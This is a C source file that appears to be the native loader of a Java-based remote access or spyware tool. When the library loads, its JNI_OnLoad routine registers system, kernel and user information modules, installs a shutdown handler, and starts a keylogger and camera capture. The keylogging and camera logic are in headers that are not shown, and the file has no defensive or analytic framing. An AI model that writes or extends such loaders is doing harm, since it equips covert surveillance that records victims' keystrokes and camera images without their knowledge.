#include <camera.h>
#include "shutdown_handler.h"
#include "Information.h"
#include "Kernel.h"
#include "User.h"
#include "keylogger.h"
#include "instance.h"

static HINSTANCE globalProgramInstance;

JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* virtualMachine, void* reserved) {
	JNIEnv* environment = NULL;
	(*virtualMachine)->GetEnv(virtualMachine, (void**) &environment, JNI_VERSION_21);

	if(!environment) {
		return JNI_VERSION_21;
	}

	RegisterShutdownHandler(environment, virtualMachine);
	InformationRegisterNatives(environment);
	KernelRegisterNatives(environment);
	UserRegisterNatives(environment);
	KeyLoggerInitialize(environment, virtualMachine);
	InitializeCamera(environment);
	return JNI_VERSION_21;
}

BOOL WINAPI DllMain(_In_ HINSTANCE instance, _In_ DWORD reason, _In_ LPVOID reserved) {
	globalProgramInstance = instance;
	return TRUE;
}

HINSTANCE GetProgramInstance() {
	return globalProgramInstance;
}
